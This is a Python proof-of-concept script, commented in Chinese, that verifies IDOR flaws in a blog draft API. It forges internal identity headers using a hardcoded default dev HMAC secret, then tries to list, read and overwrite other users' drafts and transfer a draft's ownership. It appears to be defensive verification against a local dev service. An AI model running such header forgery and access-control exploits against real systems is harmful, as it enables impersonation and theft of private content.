#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
草稿接口越权（IDOR）复现验证脚本

背景：ApArticleDraftController 的 updateDraft / getDraftById / listDrafts 未做登录与归属校验，
而同一文件的 deleteDraft 做了。本脚本直连 content 服务（绕过网关），
用内部身份签名（dev 默认密钥）伪造两个互不相关的用户身份，验证横向越权是否成立。

只读实验直接对真实数据执行；写实验用自建测试草稿，避免污染真实数据（结束时会清理）。
"""
import hashlib
import hmac
import json
import sys
import urllib.error
import urllib.request

sys.stdout.reconfigure(encoding="utf-8")

BASE = "http://127.0.0.1:51802"
SECRET = "zhuri-coding-internal-dev-secret"   # yml 里的公开默认值
PREFIX = "zhuri-coding-internal-v1"

USER_A = ("999999", "userA")   # 伪造身份 A
USER_B = ("888888", "userB")   # 伪造身份 B


def sign(user_id, nick, image=""):
    payload = "%s|%s|%s|%s" % (PREFIX, user_id, nick, image)
    return hmac.new(SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()


def call(method, path, identity=None, body=None):
    req = urllib.request.Request(BASE + path, method=method)
    if identity:
        uid, nick = identity
        req.add_header("userId", uid)
        req.add_header("nickName", nick)
        req.add_header("image", "")
        req.add_header("X-Internal-Sign", sign(uid, nick))
    data = None
    if body is not None:
        data = json.dumps(body, ensure_ascii=False).encode("utf-8")
        req.add_header("Content-Type", "application/json;charset=UTF-8")
    try:
        with urllib.request.urlopen(req, data=data, timeout=30) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, repr(e)


def brief(text, n=220):
    text = text.replace("\n", " ")
    return text if len(text) <= n else text[:n] + " ..."


def main():
    print("=" * 78)
    print("0) 前置校验：伪造签名是否被服务端信任")
    print("=" * 78)
    code, resp = call("GET", "/api/v1/ai/conversation", USER_A)
    print("[NEED_LOGIN 接口] status=%s body=%s" % (code, brief(resp)))
    print("   -> 若返回非 NEED_LOGIN，说明 dev 默认密钥 + 自算签名可冒充任意用户\n")

    print("=" * 78)
    print("1) listDrafts 横向越权：不传 authorId，能否拉到全站草稿")
    print("=" * 78)
    code, resp = call("GET", "/api/v1/draft/list?page=1&size=100", USER_A)
    print("status=%s" % code)
    try:
        obj = json.loads(resp)
        records = (obj.get("data") or {}).get("records") or []
        authors = sorted({str(r.get("authorId")) for r in records})
        leaked = [a for a in authors if a != USER_A[0]]
        print("返回草稿条数=%d，涉及作者 authorId=%s" % (len(records), authors))
        if leaked:
            print("   -> [FAIL] 仍能拿到他人草稿（作者 %s），越权未封堵" % leaked)
        else:
            print("   -> [OK] 返回的 %d 条草稿全部属于本人 userId=%s" % (len(records), USER_A[0]))
        for r in records[:3]:
            print("      样例 draftId=%s authorId=%s title=%s"
                  % (r.get("id"), r.get("authorId"), brief(str(r.get("title")), 40)))
    except Exception as e:
        print("解析失败：%s / %s" % (e, brief(resp)))

    print()
    print("=" * 78)
    print("2) getDraftById 横向越权：读取他人草稿正文")
    print("=" * 78)
    code, resp = call("GET", "/api/v1/draft/list?page=1&size=5", USER_A)
    victim = None
    try:
        for r in (json.loads(resp).get("data") or {}).get("records") or []:
            if str(r.get("authorId")) != USER_A[0] and r.get("content"):
                victim = r
                break
    except Exception:
        pass
    if not victim:
        print("未取到可用的他人草稿样本，跳过")
    else:
        code, resp = call("GET", "/api/v1/draft/%s" % victim["id"], USER_A)
        try:
            data = json.loads(resp).get("data") or {}
            body = str(data.get("content") or "")
            print("身份 userId=%s 读取 draftId=%s（真实归属 authorId=%s）"
                  % (USER_A[0], victim["id"], victim.get("authorId")))
            print("status=%s，正文长度=%d，正文开头=%s" % (code, len(body), brief(body, 100)))
            print("   -> [FAIL] 越权读取他人草稿正文成立" if body
                  else "   -> [OK] 未取到正文（他人草稿已不可见）")
        except Exception as e:
            print("解析失败：%s / %s" % (e, brief(resp)))

    print()
    print("=" * 78)
    print("3) updateDraft 横向越权 + 所有权转移（用自建测试草稿，不碰真实数据）")
    print("=" * 78)
    code, resp = call("POST", "/api/v1/draft/create", USER_A,
                      {"title": "IDOR-TEST-A", "content": "owner A content", "summary": "t"})
    try:
        draft_id = (json.loads(resp).get("data") or {}).get("id")
    except Exception:
        draft_id = None
    if not draft_id:
        print("创建测试草稿失败：%s %s" % (code, brief(resp)))
        return
    print("身份 A(%s) 创建测试草稿 draftId=%s" % (USER_A[0], draft_id))

    code, resp = call("PUT", "/api/v1/draft/update", USER_B,
                      {"id": int(draft_id), "title": "IDOR-HACKED-BY-B",
                       "content": "B overwrote this", "authorId": int(USER_B[0])})
    print("身份 B(%s) 提交 update：status=%s body=%s" % (USER_B[0], code, brief(resp)))

    code, resp = call("GET", "/api/v1/draft/%s" % draft_id, USER_A)
    try:
        data = json.loads(resp).get("data") or {}
        print("复查该草稿：title=%s content=%s authorId=%s"
              % (data.get("title"), data.get("content"), data.get("authorId")))
        if str(data.get("authorId")) == USER_B[0]:
            print("   -> [FAIL] 越权改写 + 所有权转移均成立（authorId 已被 B 抢走）")
        elif data.get("title") == "IDOR-HACKED-BY-B":
            print("   -> [FAIL] 越权改写成立（authorId 未变，取决于请求体是否带该字段）")
        else:
            print("   -> [OK] 未被他改写（title/authorId 保持原值）")
    except Exception as e:
        print("解析失败：%s / %s" % (e, brief(resp)))

    # 清理测试数据（用所有者 A 删除：修复越权后 B 已无权删 A 的草稿）
    code, resp = call("DELETE", "/api/v1/draft/%s" % draft_id, USER_A)
    print("清理测试草稿（身份 A）：status=%s body=%s" % (code, brief(resp)))


if __name__ == "__main__":
    main()
